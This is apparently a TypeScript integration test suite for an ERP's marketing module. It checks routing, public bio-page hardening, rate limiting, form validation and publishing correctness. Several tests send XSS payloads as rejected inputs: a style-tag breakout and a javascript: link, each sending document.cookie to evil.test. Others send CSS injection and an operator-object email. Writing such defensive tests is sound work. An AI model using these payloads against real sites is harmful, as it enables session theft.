import {
  AUTH_PATHS,
  MARKETING_PATHS,
  type AuthenticatedSession,
  type BrandSummary,
  type ScheduledPostSummary,
  type SocialAccountSummary,
} from '@erp/shared';
import { StubSocialNetworkAdapter } from '../src/modules/marketing/adapters/stub.adapter';
import { CrmBridgeService } from '../src/modules/marketing/crm-bridge.service';
import { companyApplied } from '../src/platform/tenancy';
import { createTestApp, resetDatabase, type TestApp } from './harness/test-app';

/**
 * Ticket 11 — the module made usable, and its unauthenticated surface defended.
 *
 * Every case here is something a user or an attacker would notice: eight tabs that show nothing,
 * a bio page that runs somebody else's script on the ERP's own origin, a form that fills a sales
 * pipeline overnight, a post published twice to a client's real account. None of it was caught
 * before, because the module's ~389 frontend tests answer from MSW mocks and never reach the
 * real Nest router — so these run over HTTP against the real application.
 */
describe('Marketing: unblocking the module and hardening the public surface', () => {
  let app: TestApp;

  type SupertestRequest = ReturnType<TestApp['http']['get']>;

  interface Tenant {
    session: AuthenticatedSession;
    as: (request: SupertestRequest) => SupertestRequest;
  }

  beforeAll(async () => {
    app = await createTestApp();
  });

  afterAll(async () => {
    await app.close();
  });

  beforeEach(async () => {
    await resetDatabase(app);
  });

  let signUps = 0;

  async function signUp(): Promise<Tenant> {
    signUps += 1;
    const response = await app.http
      .post(AUTH_PATHS.signUp)
      .send({
        companyName: `Agency ${signUps}`,
        name: 'Jane Doe',
        email: `jane${signUps}@agency.test`,
        password: 'correct-horse-battery',
      })
      .expect(201);

    const session = response.body as AuthenticatedSession;
    return { session, as: (request) => request.set('Authorization', `Bearer ${session.token}`) };
  }

  async function brandFor(tenant: Tenant, name = 'Nike Running'): Promise<BrandSummary> {
    const response = await tenant.as(app.http.post(MARKETING_PATHS.brands)).send({ name }).expect(201);
    return response.body as BrandSummary;
  }

  // ── 11.1 The route contract ───────────────────────────────────────────────────────

  describe('the route contract', () => {
    /**
     * The whole module hung on this. `MarketingController` declared `@Get(':id')` on the module
     * root and was registered first, so `/brands` was matched as an id, handed to Prisma as a
     * UUID, and came back 500 — with it the Brand Switcher, and with that every one of the nine
     * tabs, which fall through to "No Brand Selected" when no brand loads.
     */
    it('answers every list endpoint the workspace loads on startup', async () => {
      const tenant = await signUp();

      const lists = [
        MARKETING_PATHS.brands,
        MARKETING_PATHS.posts,
        MARKETING_PATHS.campaigns,
        MARKETING_PATHS.jobs,
        MARKETING_PATHS.autolists,
        MARKETING_PATHS.smartLinks,
        MARKETING_PATHS.adSyncs,
        MARKETING_PATHS.trackingSites,
      ];

      for (const path of lists) {
        const response = await tenant.as(app.http.get(path));
        expect({ path, status: response.status }).toEqual({ path, status: 200 });
        expect(Array.isArray(response.body.items)).toBe(true);
      }
    });

    it('keeps the scaffold records reachable under their own segment', async () => {
      const tenant = await signUp();

      const created = await tenant
        .as(app.http.post(MARKETING_PATHS.marketings))
        .send({ name: 'Spring Push' })
        .expect(201);

      expect(MARKETING_PATHS.marketings).toBe('/api/marketing/records');

      const fetched = await tenant
        .as(app.http.get(MARKETING_PATHS.marketing(created.body.id)))
        .expect(200);
      expect(fetched.body.name).toBe('Spring Push');
    });
  });

  // ── 11.2 The public bio page ──────────────────────────────────────────────────────

  describe('the public bio page', () => {
    async function smartLinkPayload(brand: BrandSummary, slug: string): Promise<Record<string, unknown>> {
      return {
        brandId: brand.id,
        slug,
        title: 'Nike Running',
        buttonLinks: [{ id: 'b1', title: 'Shop', url: 'https://nike.test/shop' }],
      };
    }

    it('refuses a theme colour that would close the style block', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);

      const refused = await tenant
        .as(app.http.post(MARKETING_PATHS.smartLinks))
        .send({
          ...(await smartLinkPayload(brand, 'xss-theme')),
          theme: {
            primaryColor: 'red}</style><script>fetch("//evil.test?c="+document.cookie)</script><style>{',
            backgroundColor: '#0f172a',
            textColor: '#f8fafc',
          },
        })
        .expect(422);

      // Refused, not stripped: a stored value the page then ignores is a page the author
      // believes says something it does not.
      expect(JSON.stringify(refused.body)).toContain('primaryColor');

      const links = await tenant.as(app.http.get(MARKETING_PATHS.smartLinks)).expect(200);
      expect(links.body.items).toHaveLength(0);
    });

    it('refuses a free-form font stack, which is CSS by another name', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);

      await tenant
        .as(app.http.post(MARKETING_PATHS.smartLinks))
        .send({
          ...(await smartLinkPayload(brand, 'xss-font')),
          theme: { fontFamily: 'x; } body { display: none } .a{' },
        })
        .expect(422);
    });

    it('refuses a javascript: button URL, which escaping would leave executable', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);

      const refused = await tenant
        .as(app.http.post(MARKETING_PATHS.smartLinks))
        .send({
          brandId: brand.id,
          slug: 'xss-href',
          title: 'Nike Running',
          buttonLinks: [
            { id: 'b1', title: 'Free shoes', url: 'javascript:fetch("//evil.test?c="+document.cookie)' },
          ],
        })
        .expect(422);

      expect(JSON.stringify(refused.body)).toContain('javascript:');
    });

    it('serves the page under a nonce CSP that permits nothing inline', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);

      await tenant
        .as(app.http.post(MARKETING_PATHS.smartLinks))
        .send(await smartLinkPayload(brand, 'nike'))
        .expect(201);

      const page = await app.http.get(MARKETING_PATHS.publicSmartLink('nike')).expect(200);

      const policy = String(page.headers['content-security-policy'] ?? '');
      expect(policy).toBeDefined();
      expect(policy).not.toContain('unsafe-');
      expect(policy).toContain("default-src 'none'");
      expect(policy).toContain("frame-ancestors 'none'");

      // The nonce is in the header and on the tags, and it is a fresh one each time.
      const nonce = /script-src 'nonce-([^']+)'/.exec(policy)?.[1];
      expect(nonce).toBeTruthy();
      expect(page.text).toContain(`<script nonce="${nonce}">`);
      expect(page.text).toContain(`<style nonce="${nonce}">`);

      const again = await app.http.get(MARKETING_PATHS.publicSmartLink('nike')).expect(200);
      expect(again.headers['content-security-policy']).not.toBe(policy);
    });

    /**
     * The rows that predate the typed columns are still in the database, and one of them must
     * not be able to take down a page anybody can reach without signing in. A malformed entry
     * costs its own card; the page still answers.
     */
    it('renders around a legacy row holding numbers, nested objects and nulls', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);

      await app.prisma.smartLink.create({
        data: {
          companyId: tenant.session.company.id,
          brandId: brand.id,
          slug: 'legacy',
          title: 'Legacy Page',
          theme: { primaryColor: 42, fontFamily: { nested: true } } as never,
          buttonLinks: [
            7,
            null,
            { id: 'ok', title: 'Real button', url: 'https://nike.test/ok' },
            { id: 'bad', title: 'Broken', url: 'javascript:alert(1)' },
            { nested: { deeply: true } },
          ] as never,
          shoppableGrid: [null, 3, { id: 'g', imageUrl: 5, productUrl: 'https://nike.test/p' }] as never,
          socialLinks: [{ platform: null, url: 'https://nike.test' }, 'oops'] as never,
        },
      });

      const page = await app.http.get(MARKETING_PATHS.publicSmartLink('legacy')).expect(200);

      expect(page.text).toContain('Real button');
      // The one good link survives; the javascript: one does not reach the document at all.
      expect(page.text).not.toContain('javascript:');
      expect(page.text).toContain('Legacy Page');
    });
  });

  // ── 11.3 Rate limiting and form validation ────────────────────────────────────────

  describe('the unauthenticated write surface', () => {
    async function formFor(tenant: Tenant, brand: BrandSummary, name: string): Promise<string> {
      const response = await tenant
        .as(app.http.post(MARKETING_PATHS.forms))
        .send({ brandId: brand.id, name })
        .expect(201);
      return response.body.id as string;
    }

    it('refuses a submission that does not match the form’s own schema', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Contact Sales');

      // The default schema declares name and email required. Sending neither used to reach the
      // CRM anyway, because `schemaFields` was decorative.
      const refused = await app.http
        .post(MARKETING_PATHS.publicFormSubmit(formId))
        .send({ fields: { phone: '+1 555-0199' } })
        .expect(400);

      expect(refused.body.fields).toHaveProperty('email');
      expect(refused.body.fields.email).toContain('required');

      expect(await app.prisma.lead.count()).toBe(0);
    });

    it('answers 400, not 500, when a contact field is not a string', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Whitepaper');

      // `fields.email as string` was a cast, so an object reached a Prisma string column and an
      // unauthenticated caller got to pick the status code.
      const refused = await app.http
        .post(MARKETING_PATHS.publicFormSubmit(formId))
        .send({ fields: { name: 'Ellen Ripley', email: { $ne: null } } })
        .expect(400);

      expect(refused.body.fields).toHaveProperty('email');
      expect(JSON.stringify(refused.body)).not.toContain('prisma');
    });

    it('drops a key the form no longer declares rather than refusing the submission', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Newsletter');

      // A page that has been open in a tab since yesterday still posts yesterday's shape.
      const accepted = await app.http
        .post(MARKETING_PATHS.publicFormSubmit(formId))
        .send({
          fields: { name: 'Ellen Ripley', email: 'ripley@weyland.test', retiredField: 'ignored' },
        })
        .expect(200);

      expect(accepted.body.success).toBe(true);

      const submission = await app.prisma.leadCaptureSubmission.findFirst();
      expect(submission?.rawPayload).not.toHaveProperty('retiredField');
    });

    it('refuses a submission that filled in the honeypot', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Demo Request');

      await app.http
        .post(MARKETING_PATHS.publicFormSubmit(formId))
        .send({ fields: { name: 'Bot', email: 'bot@spam.test', _hp: 'filled in' } })
        .expect(400);

      expect(await app.prisma.lead.count()).toBe(0);
    });

    /**
     * The three writes used to be three statements, so a failure after the lead was created left
     * an orphan in the sales pipeline with no submission to explain where it came from.
     */
    it('leaves no lead behind when the submission cannot be stored', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Contact Sales');

      // A CRM bridge that writes the lead and then fails is exactly the sequence that used to
      // leave an orphan: the lead was committed by its own statement long before the submission
      // row was attempted.
      const bridge = app.nest.get(CrmBridgeService);
      const handoff = jest
        .spyOn(bridge, 'handoffLead')
        .mockImplementation(async (_params, options) => {
          await options!.client!.lead.create({
            data: companyApplied({ name: 'Ellen Ripley', email: 'ripley@weyland.test' }),
          });
          throw new Error('CRM bridge unavailable');
        });

      try {
        await app.http
          .post(MARKETING_PATHS.publicFormSubmit(formId))
          .send({ fields: { name: 'Ellen Ripley', email: 'ripley@weyland.test' } })
          .expect(500);
      } finally {
        handoff.mockRestore();
      }

      expect(await app.prisma.lead.count()).toBe(0);
      expect(await app.prisma.leadCaptureSubmission.count()).toBe(0);

      // And nothing downstream was told about a lead that does not exist.
      const form = await app.prisma.leadCaptureForm.findUnique({ where: { id: formId } });
      expect(form?.submitCount).toBe(0);
    });

    it('refuses a flood of form submissions with 429 and a Retry-After', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const formId = await formFor(tenant, brand, 'Flooded Form');

      const submit = (n: number) =>
        app.http
          .post(MARKETING_PATHS.publicFormSubmit(formId))
          .send({ fields: { name: `Visitor ${n}`, email: `visitor${n}@example.test` } });

      for (let n = 0; n < 10; n += 1) {
        await submit(n).expect(200);
      }

      const refused = await submit(11).expect(429);
      expect(refused.headers['retry-after']).toBeDefined();
      // No detail: the window, the count and the bucket are all things a flooder would tune on.
      expect(refused.body.message).toBe('Too many requests. Try again shortly.');
      expect(JSON.stringify(refused.body)).not.toContain('10');
    });

    it('refuses a flood of tracking beacons', async () => {
      const beacon = () =>
        app.http.post(MARKETING_PATHS.collect).send({
          pixelKey: 'unknown-pixel-for-the-flood',
          visitorId: 'v1',
          path: '/',
        });

      for (let n = 0; n < 120; n += 1) {
        await beacon().expect(204);
      }

      const refused = await beacon().expect(429);
      expect(refused.headers['retry-after']).toBeDefined();
    });

    it('refuses a flood of bio-page click beacons', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      await tenant
        .as(app.http.post(MARKETING_PATHS.smartLinks))
        .send({
          brandId: brand.id,
          slug: 'flooded',
          title: 'Flooded',
          buttonLinks: [{ id: 'b1', title: 'Shop', url: 'https://nike.test/shop' }],
        })
        .expect(201);

      const click = () =>
        app.http.post(MARKETING_PATHS.publicSmartLinkClick('flooded')).send({ buttonId: 'b1' });

      for (let n = 0; n < 60; n += 1) {
        await click().expect(200);
      }

      const refused = await click().expect(429);
      expect(refused.headers['retry-after']).toBeDefined();
    });
  });

  // ── 11.4 Publishing correctness and the vault ─────────────────────────────────────

  describe('publishing', () => {
    async function accountFor(tenant: Tenant, brand: BrandSummary): Promise<SocialAccountSummary> {
      const response = await tenant
        .as(app.http.post(MARKETING_PATHS.connectAccount(brand.id)))
        .send({
          platform: 'instagram',
          accountName: '@nikerunning',
          platformAccountId: 'ig_1',
          accessToken: 'super_secret_access_token_abcd',
        })
        .expect(201);
      return response.body as SocialAccountSummary;
    }

    /**
     * The worst outcome in the module: a duplicate post on a client's real account, externally
     * visible and not undoable. Read-then-write let both callers past.
     */
    it('publishes once when two callers race for the same post', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const account = await accountFor(tenant, brand);

      const post = (
        await tenant
          .as(app.http.post(MARKETING_PATHS.posts))
          .send({
            brandId: brand.id,
            socialAccountId: account.id,
            content: 'New drop today',
            scheduledAt: new Date(Date.now() + 3_600_000).toISOString(),
          })
          .expect(201)
      ).body as ScheduledPostSummary;

      const adapter = app.nest.get(StubSocialNetworkAdapter);
      const publish = jest.spyOn(adapter, 'publishPost');

      try {
        const [first, second] = await Promise.all([
          tenant.as(app.http.post(MARKETING_PATHS.publishPostNow(post.id))),
          tenant.as(app.http.post(MARKETING_PATHS.publishPostNow(post.id))),
        ]);

        expect([first.status, second.status].sort()).toEqual([201, 201]);
        expect(publish).toHaveBeenCalledTimes(1);
      } finally {
        publish.mockRestore();
      }

      const stored = await app.prisma.scheduledPost.findUnique({ where: { id: post.id } });
      expect(stored?.status).toBe('PUBLISHED');
    });

    /**
     * The old guard counted by `createdAt` with status `IN ('PUBLISHED','SCHEDULED')`, so it
     * fired in exactly the two cases where it should not have: blocking today after a bulk
     * schedule for next month, and letting last week's fifty fire this morning unguarded.
     */
    it('does not spend today’s quota on posts scheduled for next month', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const account = await accountFor(tenant, brand);

      const nextMonth = new Date(Date.now() + 30 * 24 * 3_600_000);
      await app.prisma.scheduledPost.createMany({
        data: Array.from({ length: 60 }, (_, n) => ({
          companyId: tenant.session.company.id,
          brandId: brand.id,
          socialAccountId: account.id,
          content: `Bulk ${n}`,
          scheduledAt: nextMonth,
          status: 'SCHEDULED',
        })),
      });

      await tenant
        .as(app.http.post(MARKETING_PATHS.posts))
        .send({
          brandId: brand.id,
          socialAccountId: account.id,
          content: 'One more for today',
          scheduledAt: new Date(Date.now() + 3_600_000).toISOString(),
        })
        .expect(201);

      const status = await tenant
        .as(app.http.get(`${MARKETING_PATHS.socialAccount(account.id)}/rate-limits`))
        .expect(200);
      expect(status.body.publishing.used).toBe(0);
      expect(status.body.publishing.remaining).toBe(50);
    });

    it('does spend the quota on posts that actually reached the platform', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const account = await accountFor(tenant, brand);

      const published = new Date(Date.now() - 3_600_000);
      await app.prisma.scheduledPost.createMany({
        data: Array.from({ length: 50 }, (_, n) => ({
          companyId: tenant.session.company.id,
          brandId: brand.id,
          socialAccountId: account.id,
          content: `Published ${n}`,
          scheduledAt: published,
          publishedAt: published,
          status: 'PUBLISHED',
        })),
      });

      const refused = await tenant
        .as(app.http.post(MARKETING_PATHS.posts))
        .send({
          brandId: brand.id,
          socialAccountId: account.id,
          content: 'Fifty-first',
          scheduledAt: new Date(Date.now() + 3_600_000).toISOString(),
        })
        .expect(429);
      expect(refused.body.code).toBe('rate_limit_exceeded');

      const status = await tenant
        .as(app.http.get(`${MARKETING_PATHS.socialAccount(account.id)}/rate-limits`))
        .expect(200);
      // The enforced number and the displayed number come from one helper, so they agree.
      expect(status.body.publishing.used).toBe(50);
      expect(status.body.publishing.remaining).toBe(0);
    });

    it('never lets ciphertext out of the service layer', async () => {
      const tenant = await signUp();
      const brand = await brandFor(tenant);
      const account = await accountFor(tenant, brand);

      // The mask is of the token, not of the GCM auth tag it used to show four characters of.
      expect(account.maskedAccessToken).toBe('••••••••abcd');

      const responses = [
        await tenant.as(app.http.get(MARKETING_PATHS.socialAccount(account.id))).expect(200),
        await tenant.as(app.http.get(MARKETING_PATHS.brandSocialAccounts(brand.id))).expect(200),
        await tenant.as(app.http.get(MARKETING_PATHS.brand(brand.id))).expect(200),
        await tenant.as(app.http.get(MARKETING_PATHS.expiringAccounts(brand.id))).expect(200),
      ];

      for (const response of responses) {
        for (const key of fieldNames(response.body)) {
          expect(key).not.toMatch(/^encrypted/);
        }
        expect(JSON.stringify(response.body)).not.toContain('super_secret_access_token_abcd');
      }
    });
  });
});

/** Every field name anywhere in a response body, however deeply nested. */
function fieldNames(value: unknown, seen: string[] = []): string[] {
  if (Array.isArray(value)) {
    for (const item of value) fieldNames(item, seen);
    return seen;
  }
  if (value && typeof value === 'object') {
    for (const [key, nested] of Object.entries(value)) {
      seen.push(key);
      fieldNames(nested, seen);
    }
  }
  return seen;
}
